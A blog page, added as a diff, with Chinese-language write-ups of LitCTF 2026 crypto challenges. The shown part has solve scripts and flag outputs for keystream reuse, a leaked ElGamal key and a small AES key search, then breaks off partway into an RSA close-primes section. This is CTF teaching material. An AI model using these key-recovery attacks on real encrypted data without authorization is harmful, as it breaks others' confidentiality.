@@ -1,0 +1,1119 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/images/avatar.jpg">
+  <link rel="icon" href="/images/avatar.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#131c29">
+  <meta name="author" content="b3nk">
+  <meta name="keywords" content="CTF, Cybersecurity, Web Security, Pwn, Writeup">
+  
+    <meta name="description" content="把 LitCTF 2026 里几道 Crypto、Reverse 和 Pwn 方向题目整理成一篇统一归档的题解合集。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LitCTF 2026 题解合集">
+<meta property="og:url" content="https://b3nk-x1.github.io/posts/litctf-2026-writeups/index.html">
+<meta property="og:site_name" content="b3nk&#39;s Blog">
+<meta property="og:description" content="把 LitCTF 2026 里几道 Crypto、Reverse 和 Pwn 方向题目整理成一篇统一归档的题解合集。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-06-20T06:45:00.000Z">
+<meta property="article:modified_time" content="2026-06-20T06:04:34.271Z">
+<meta property="article:author" content="b3nk">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Crypto">
+<meta property="article:tag" content="LitCTF">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="Reverse">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>LitCTF 2026 题解合集 - b3nk&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"b3nk-x1.github.io","root":"/","version":"1.9.9","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":2,"color":"#7d92a8","options":{"showSpinner":false,"trickleSpeed":120}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.1"><link rel="alternate" href="/atom.xml" title="b3nk's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 42vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>b3nk&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="https://github.com/b3nk-x1" target="_self">
+                <i class="iconfont icon-github-fill"></i>
+                <span>GitHub</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="https://github.com/b3nk-x1" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-github-fill"></i>
+                  <span>GitHub</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/images/page-hero.svg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.14)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle">LitCTF 2026 题解合集</span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-06-20 14:45" pubdate>
+          2026-06-20
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">LitCTF 2026 题解合集</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>这篇把 LitCTF 2026 里我整理过的几道题合并到一篇里，按 Crypto、Reverse、Pwn 三个方向统一归档，后面回看和检索会更方便。</p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="LitCTF2026-lit-xor-two-story"><a href="#LitCTF2026-lit-xor-two-story" class="headerlink" title="[LitCTF2026] lit_xor_two_story"></a>[LitCTF2026] lit_xor_two_story</h3><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>题目给了两组密文 <code>c1</code>、<code>c2</code>，并说明两条明文长度都是 40 字节，同时使用了同一串随机密钥流 <code>k</code> 做异或加密。</p>
+<p>加密逻辑如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">c1 = xor_bytes(M1_FLAG, k)<br>c2 = xor_bytes(M2_KNOWN, k)<br></code></pre></td></tr></table></figure>
+
+<p>其中第二条明文是公开的：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">M2_KNOWN = <span class="hljs-string">b&quot;litctf2026_xor_keystream_reuse_40bytes!!&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>所以问题出在同一个密钥流被复用了。流密码里同一段 keystream 只能用一次，否则两组密文异或后，密钥流会被抵消。</p>
+<h4 id="推导过程"><a href="#推导过程" class="headerlink" title="推导过程"></a>推导过程</h4><p>已知：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">c1 = m1 ^ k<br>c2 = m2 ^ k<br></code></pre></td></tr></table></figure>
+
+<p>两边异或：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">c1 ^ c2 = m1 ^ k ^ m2 ^ k<br>        = m1 ^ m2<br></code></pre></td></tr></table></figure>
+
+<p>因为 <code>m2</code> 是公开明文，所以可以继续异或回去：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">m1 = c1 ^ c2 ^ m2<br></code></pre></td></tr></table></figure>
+
+<p>这样就能直接恢复第一条明文，也就是 flag。</p>
+<h4 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">c1 = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;5f70a847ce12759e156e3cad1aa9530a119386a02ffc1c31bf14ab7a0a82ccc108f8476f75c98a28&quot;</span>)<br>c2 = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;5f70a847ce123cc153283ca710ae7f042b8490a238eb2228970fad6a2694f2985dc5557e69e5f474&quot;</span>)<br><br>m2 = <span class="hljs-string">b&quot;litctf2026_xor_keystream_reuse_40bytes!!&quot;</span><br><br>m1 = <span class="hljs-built_in">bytes</span>(x ^ y ^ z <span class="hljs-keyword">for</span> x, y, z <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(c1, c2, m2))<br><span class="hljs-built_in">print</span>(m1.decode())<br></code></pre></td></tr></table></figure>
+
+<h4 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">litctf&#123;otp_reuse_never_twice_same_key__&#125;<br></code></pre></td></tr></table></figure>
+
+<p>最终得到 flag：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">litctf&#123;otp_reuse_never_twice_same_key__&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="LitCTF2026-lit-elgamal-handshake"><a href="#LitCTF2026-lit-elgamal-handshake" class="headerlink" title="[LitCTF2026] lit_elgamal_handshake"></a>[LitCTF2026] lit_elgamal_handshake</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>服务端使用 ElGamal 加密 flag，但是调试日志没有关闭，把长期私钥 <code>x</code> 一起打印了出来。</p>
+<p>附件中给出了公钥：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">p, g, y<br></code></pre></td></tr></table></figure>
+
+<p>密文：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">c1, c2<br></code></pre></td></tr></table></figure>
+
+<p>以及泄露出来的私钥：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">x<br></code></pre></td></tr></table></figure>
+
+<h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>ElGamal 加密过程如下：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">y = g^x mod p<br>c1 = g^k mod p<br>c2 = m * y^k mod p<br></code></pre></td></tr></table></figure>
+
+<p>其中 <code>x</code> 是私钥，<code>k</code> 是随机数，<code>m</code> 是明文。</p>
+<p>正常情况下不知道 <code>x</code>，就不能从 <code>c1</code> 还原共享密钥。但题目直接把 <code>x</code> 打印出来了，所以可以计算：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">s = c1^x mod p<br></code></pre></td></tr></table></figure>
+
+<p>因为：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">c1^x = (g^k)^x = g^(kx) = (g^x)^k = y^k mod p<br></code></pre></td></tr></table></figure>
+
+<p>也就是说，<code>s</code> 就是加密时乘到明文上的共享密钥。</p>
+<p>密文满足：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">c2 = m * s mod p<br></code></pre></td></tr></table></figure>
+
+<p>所以明文可以直接恢复：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">m = c2 * s^(-1) mod p<br></code></pre></td></tr></table></figure>
+
+<p>其中 <code>s^(-1)</code> 是 <code>s</code> 在模 <code>p</code> 下的逆元。</p>
+<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>p = <span class="hljs-number">9000784855376359808051354825193962042770028561343848432778443672755982397391267124312572697249531643069409873722736348916207732622884411596948807031140651</span><br>g = <span class="hljs-number">3</span><br>y = <span class="hljs-number">269130883529708333054320571854006406481346665463416017026083074488011546059928157925990665431751017523964760326934454181952822744463714981243407307134357</span><br><br>c1 = <span class="hljs-number">5245857426274383693193378669425243235151460522527004924092730024427525619244222247576829782077334810173274945751493387545849499010408499951268967774043627</span><br>c2 = <span class="hljs-number">6059939492718262451327758167005534191200936922719178843825888167191062504030471358635203794720371216217447404436172970111033824674731063386612549785069654</span><br><br>x = <span class="hljs-number">633366293219022684108628483753423657477324253833657141033762971761747669344649667887002347907882241246119223126492863291886751205505360049793728851371884</span><br><br>s = <span class="hljs-built_in">pow</span>(c1, x, p)<br>m = c2 * <span class="hljs-built_in">pow</span>(s, -<span class="hljs-number">1</span>, p) % p<br><br>flag = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(flag.decode())<br></code></pre></td></tr></table></figure>
+
+<h4 id="运行结果-1"><a href="#运行结果-1" class="headerlink" title="运行结果"></a>运行结果</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">litctf&#123;elgamal_leak_makes_happy_decrypt&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">litctf&#123;elgamal_leak_makes_happy_decrypt&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="LitCTF2026-lit-tiny-key-aes"><a href="#LitCTF2026-lit-tiny-key-aes" class="headerlink" title="[LitCTF2026] lit_tiny_key_aes"></a>[LitCTF2026] lit_tiny_key_aes</h3><h4 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h4><p>题目给出 AES-128-ECB 加密脚本，关键代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">KEY_PREFIX = <span class="hljs-string">b&quot;LitCTF2026!!!&quot;</span>  <span class="hljs-comment"># 13 bytes; 3 bytes brute-forced</span><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(KEY_PREFIX) + <span class="hljs-built_in">len</span>(UNKNOWN_KEY_SUFFIX) == <span class="hljs-number">16</span><br><br>key = KEY_PREFIX + UNKNOWN_KEY_SUFFIX<br>c = encrypt_aes_ecb_pkcs7(FLAG, key)<br></code></pre></td></tr></table></figure>
+
+<p>同时给出密文：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">c = <span class="hljs-string">b&quot;\x0c\xdb&#x27;`\xc91\xf7\x05\x91+\x0fM\xed\xbc\x9b\xf1\xd8D\xcd\xfd\x0c\xb9\xb6\xb2J&lt;\x86\x19\x06K\xb3\xa2\xa4\x18\x87&lt;v\xac\x1bbu#\xaa\xb5I\x7f\xd8\xd3&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h4><p>AES-128 的密钥长度为 16 字节。题目中已经固定了前 13 字节：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&quot;LitCTF2026!!!&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>剩下只有 3 字节未知，因此密钥空间为：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">2^24 = 16777216<br></code></pre></td></tr></table></figure>
+
+<p>这个规模可以直接离线爆破。</p>
+<p>加密模式是 AES-ECB，填充方式是 PKCS#7，所以枚举每个 3 字节后缀后，直接解密密文并尝试去填充。如果去填充成功，并且结果是可打印字符串且包含 <code>ctf{</code>，基本就能确定为正确明文。</p>
+<h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><br>KEY_PREFIX = <span class="hljs-string">b&quot;LitCTF2026!!!&quot;</span><br><br>c = <span class="hljs-string">b&quot;\x0c\xdb&#x27;`\xc91\xf7\x05\x91+\x0fM\xed\xbc\x9b\xf1\xd8D\xcd\xfd\x0c\xb9\xb6\xb2J&lt;\x86\x19\x06K\xb3\xa2\xa4\x18\x87&lt;v\xac\x1bbu#\xaa\xb5I\x7f\xd8\xd3&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_printable</span>(<span class="hljs-params">bs: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">all</span>(<span class="hljs-number">32</span> &lt;= x &lt; <span class="hljs-number">127</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> bs)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] key prefix:&quot;</span>, KEY_PREFIX)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] brute force suffix: 0x000000 ~ 0xffffff&quot;</span>)<br><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x1000000</span>):<br>        suffix = x.to_bytes(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;big&quot;</span>)<br>        key = KEY_PREFIX + suffix<br><br>        cipher = AES.new(key, AES.MODE_ECB)<br>        pt = cipher.decrypt(c)<br><br>        <span class="hljs-keyword">try</span>:<br>            msg = unpad(pt, <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">except</span> ValueError:<br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">if</span> is_printable(msg) <span class="hljs-keyword">and</span> <span class="hljs-string">b&quot;ctf&#123;&quot;</span> <span class="hljs-keyword">in</span> msg.lower():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] found!&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] suffix hex:&quot;</span>, suffix.<span class="hljs-built_in">hex</span>())<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] key hex   :&quot;</span>, key.<span class="hljs-built_in">hex</span>())<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] plaintext :&quot;</span>, msg.decode())<br>            <span class="hljs-keyword">return</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] not found&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
+
+<h4 id="运行结果-2"><a href="#运行结果-2" class="headerlink" title="运行结果"></a>运行结果</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">[*] key prefix: b&#x27;LitCTF2026!!!&#x27;<br>[*] brute force suffix: 0x000000 ~ 0xffffff<br>[+] found!<br>[+] suffix hex: 37a201<br>[+] key hex   : 4c69744354463230323621212137a201<br>[+] plaintext : litctf&#123;aes_tiny_brut3_for_the_win!&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag"></a>Flag</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">litctf&#123;aes_tiny_brut3_for_the_win!&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="LitCTF2026-lit-rsa-neighbor"><a href="#LitCTF2026-lit-rsa-neighbor" class="headerlink" title="[LitCTF2026] lit_rsa_neighbor"></a>[LitCTF2026] lit_rsa_neighbor</h3><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><p>题目给了 RSA 加密脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">p = getPrime(<span class="hljs-number">512</span>)<br>q = p<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(NEXT_PRIME_STEPS):<br>    q = <span class="hljs-built_in">int</span>(gmpy2.next_prime(q))<br><br>n = p * q<br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br></code></pre></td></tr></table></figure>
+
+<p>并给出：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">n = 139637440016232025690294457609899605991056011052010466558411851317943636600860419882966079629826706361935550982744312593243181819999590825159611186779613601241742349986440676188542381451066058816661317621009248513651083772907520139375108426466691332559612971244160246310746215067136490772061317571744230078911<br>c = 81172369642931859390486697024961350889751244109623802937988620847486863147682579984823958801948701482096140632580173113959531836503723522945335985723867818778699337807630592078265626995722998378992215523352858561923474395550395284015986525513984910021995657780411466237306614109262460764382539311725297619429<br>e = 65537<br></code></pre></td></tr></table></figure>
+
+<p>题目重点在于 <code>q</code> 不是随机生成的，而是从 <code>p</code> 开始连续取 <code>next_prime</code> 得到的，所以 <code>p</code> 和 <code>q</code> 的距离比较近。</p>
+<p>这种情况下可以使用 Fermat 分解。</p>
+<hr>
+<h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><p>RSA 中：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">n = p * q<br></code></pre></td></tr></table></figure>
+
+<p>如果 <code>p</code> 和 <code>q</code> 很接近，可以把它写成平方差形式：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">n = a^2 - b^2<br>n = (a - b)(a + b)<br></code></pre></td></tr></table></figure>
+
+<p>其中：</p>
